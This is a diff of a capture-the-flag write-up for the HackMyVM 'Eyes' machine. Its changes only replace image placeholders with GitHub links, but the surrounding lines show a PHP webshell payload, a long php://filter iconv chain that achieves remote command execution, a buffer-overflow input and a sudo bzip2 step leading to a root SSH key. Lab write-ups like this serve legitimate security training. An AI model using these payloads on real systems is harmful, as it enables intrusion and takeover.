@@ -16,7 +16,7 @@ Today we are back with another HackMyVM machine named **Eyes**, a medium-difficu
 
 The target IP was provided directly on the machine banner.
 
-![Eyes Machine Banner](URL 1)
+![Eyes Machine Banner](https://github.com/naval0505/HackMyVM/blob/f30fbd58a30e1f18aa63f05ce1bbb2b8c5ff37aa/Eyes%20-%20HackMyVM%20Writeup/Images/q1.png)
 
 Our target IP:
 
@@ -26,7 +26,7 @@ Our target IP:
 
 We started with an all-port Nmap scan.
 
-![Nmap All-Port Scan](URL 2)
+![Nmap All-Port Scan](https://github.com/naval0505/HackMyVM/blob/f30fbd58a30e1f18aa63f05ce1bbb2b8c5ff37aa/Eyes%20-%20HackMyVM%20Writeup/Images/q2.png)
 
 ```bash
 nmap -p- 192.168.56.150
@@ -43,7 +43,7 @@ PORT   STATE SERVICE
 
 Next, we performed service and version detection.
 
-![Nmap Service Detection](URL 3)
+![Nmap Service Detection](https://github.com/naval0505/HackMyVM/blob/f30fbd58a30e1f18aa63f05ce1bbb2b8c5ff37aa/Eyes%20-%20HackMyVM%20Writeup/Images/q3.png)
 
 ```bash
 nmap -sC -sV -p 21,22,80 192.168.56.150
@@ -65,7 +65,7 @@ The FTP service allowed anonymous login, making it the first service to investig
 
 We connected to the FTP service.
 
-![FTP Enumeration](URL 4)
+![FTP Enumeration](https://github.com/naval0505/HackMyVM/blob/f30fbd58a30e1f18aa63f05ce1bbb2b8c5ff37aa/Eyes%20-%20HackMyVM%20Writeup/Images/q4.png)
 
 ```bash
 ftp 192.168.56.150
@@ -75,11 +75,11 @@ The FTP server allowed anonymous access and exposed a file named `index.php`.
 
 The file appeared to be associated with the web application, suggesting that FTP and the web server might share related files or directories.
 
-![FTP and Web Server Relationship](URL 5)
+![FTP and Web Server Relationship](https://github.com/naval0505/HackMyVM/blob/f30fbd58a30e1f18aa63f05ce1bbb2b8c5ff37aa/Eyes%20-%20HackMyVM%20Writeup/Images/q5.png)
 
 We investigated whether we could upload a PHP reverse shell through FTP and then access it through the web server. However, the FTP account did not have permission to upload files.
 
-![FTP Upload Permission Denied](URL 6)
+![FTP Upload Permission Denied](https://github.com/naval0505/HackMyVM/blob/f30fbd58a30e1f18aa63f05ce1bbb2b8c5ff37aa/Eyes%20-%20HackMyVM%20Writeup/Images/q6.png)
 
 Since direct upload was unavailable, we moved on to web application enumeration.
 
@@ -89,7 +89,7 @@ Since direct upload was unavailable, we moved on to web application enumeration.
 
 After further web fuzzing, we discovered a Local File Inclusion (LFI) vulnerability.
 
-![LFI Discovery](URL 7)
+![LFI Discovery](https://github.com/naval0505/HackMyVM/blob/f30fbd58a30e1f18aa63f05ce1bbb2b8c5ff37aa/Eyes%20-%20HackMyVM%20Writeup/Images/q7.png)
 
 The vulnerability allowed us to read local files through the web application. We tested file access and used it to inspect system information, including `/etc/passwd`.
 
@@ -109,7 +109,7 @@ The PHP payload used in the notes was:
 <?php system($_GET['cmd']); ?>
 ```
 
-![FTP Log Poisoning Payload](URL 8)
+![FTP Log Poisoning Payload](https://github.com/naval0505/HackMyVM/blob/f30fbd58a30e1f18aa63f05ce1bbb2b8c5ff37aa/Eyes%20-%20HackMyVM%20Writeup/Images/q8.png)
 
 If the injected PHP code is written into a log file that the web application can include, a request parameter such as `cmd` may be used to execute commands on the target.
 
@@ -123,7 +123,7 @@ The original payload was:
 http://192.168.56.150/?fil3=php://filter/convert.%2569conv.UTF8.CSISO2022KR|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.SE2.UTF-16|convert.%2569conv.CSIBM921.NAPLPS|convert.%2569conv.855.CP936|convert.%2569conv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.SE2.UTF-16|convert.%2569conv.CSIBM1161.IBM-932|convert.%2569conv.MS932.MS936|convert.%2569conv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.IBM869.UTF16|convert.%2569conv.L3.CSISO90|convert.%2569conv.UCS2.UTF-8|convert.%2569conv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.8859_3.UTF16|convert.%2569conv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CP367.UTF-16|convert.%2569conv.CSIBM901.SHIFT_JISX0213|convert.%2569conv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.INIS.UTF16|convert.%2569conv.CSIBM1133.IBM943|convert.%2569conv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CP861.UTF-16|convert.%2569conv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.865.UTF16|convert.%2569conv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.SE2.UTF-16|convert.%2569conv.CSIBM1161.IBM-932|convert.%2569conv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.INIS.UTF16|convert.%2569conv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CP861.UTF-16|convert.%2569conv.L4.GB13000|convert.%2569conv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.UTF8.UTF16LE|convert.%2569conv.UTF8.CSISO2022KR|convert.%2569conv.UCS2.UTF8|convert.%2569conv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.PT.UTF32|convert.%2569conv.KOI8-U.IBM-932|convert.%2569conv.SJIS.EUCJP-WIN|convert.%2569conv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CP367.UTF-16|convert.%2569conv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.PT.UTF32|convert.%2569conv.KOI8-U.IBM-932|convert.%2569conv.SJIS.EUCJP-WIN|convert.%2569conv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CP367.UTF-16|convert.%2569conv.CSIBM901.SHIFT_JISX0213|convert.%2569conv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CSIBM1161.UNICODE|convert.%2569conv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.ISO2022KR.UTF16|convert.%2569conv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.INIS.UTF16|convert.%2569conv.CSIBM1133.IBM943|convert.%2569conv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.SE2.UTF-16|convert.%2569conv.CSIBM1161.IBM-932|convert.%2569conv.MS932.MS936|convert.%2569conv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=id
 ```
 
-![Command Execution Result](URL 9)
+![Command Execution Result](https://github.com/naval0505/HackMyVM/blob/f30fbd58a30e1f18aa63f05ce1bbb2b8c5ff37aa/Eyes%20-%20HackMyVM%20Writeup/Images/q9.png)
 
 The notes show that command execution was achieved and that the web process was running as `www-data`.
 
@@ -160,7 +160,7 @@ We now had an initial shell as `www-data`.
 
 The initial reverse shell was not fully interactive, so we stabilized it before continuing.
 
-![Stabilized Shell](URL 10)
+![Stabilized Shell](https://github.com/naval0505/HackMyVM/blob/f30fbd58a30e1f18aa63f05ce1bbb2b8c5ff37aa/Eyes%20-%20HackMyVM%20Writeup/Images/q10.png)
 
 A typical shell stabilization sequence is:
 
@@ -199,13 +199,13 @@ During enumeration, we discovered an interesting file:
 /opt/note.txt
 ```
 
-![Monica Notes](URL 11)
+![Monica Notes](https://github.com/naval0505/HackMyVM/blob/f30fbd58a30e1f18aa63f05ce1bbb2b8c5ff37aa/Eyes%20-%20HackMyVM%20Writeup/Images/q11.png)
 
 The note mentioned Monica's work on a new `ls` program and C-language source code. This suggested that a custom binary might provide a route to a more privileged shell.
 
 We examined the program's source code.
 
-![Custom ls Source Code](URL 12)
+![Custom ls Source Code](https://github.com/naval0505/HackMyVM/blob/f30fbd58a30e1f18aa63f05ce1bbb2b8c5ff37aa/Eyes%20-%20HackMyVM%20Writeup/Images/q12.png)
 
 The notes indicate that the program accepted a name and then executed `ls`. We tested the program with a long input:
 
@@ -226,7 +226,7 @@ Hi aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabash, Im exec
 Output:
 ```
 
-![Monica Shell](URL 13)
+![Monica Shell](https://github.com/naval0505/HackMyVM/blob/f30fbd58a30e1f18aa63f05ce1bbb2b8c5ff37aa/Eyes%20-%20HackMyVM%20Writeup/Images/q13.png)
 
 The notes show that this step led to a shell as Monica. The exact source-code flaw and exploitation steps are not included in the supplied notes, so the specific vulnerability cannot be confirmed from the text alone.
 
@@ -272,13 +272,13 @@ User monica may run the following commands on eyes:
 
 This meant Monica could run `bzip2` as root without entering a password.
 
-![Sudo Permissions](URL 14)
+![Sudo Permissions](https://github.com/naval0505/HackMyVM/blob/f30fbd58a30e1f18aa63f05ce1bbb2b8c5ff37aa/Eyes%20-%20HackMyVM%20Writeup/Images/q14.png)
 
 We investigated this permitted binary as the final privilege-escalation path.
 
 The notes indicate that a root SSH private key was recovered during this step.
 
-![Root SSH Key](URL 15)
+![Root SSH Key](https://github.com/naval0505/HackMyVM/blob/f30fbd58a30e1f18aa63f05ce1bbb2b8c5ff37aa/Eyes%20-%20HackMyVM%20Writeup/Images/q15.png)
 
 After saving the recovered key, we set restrictive permissions:
 
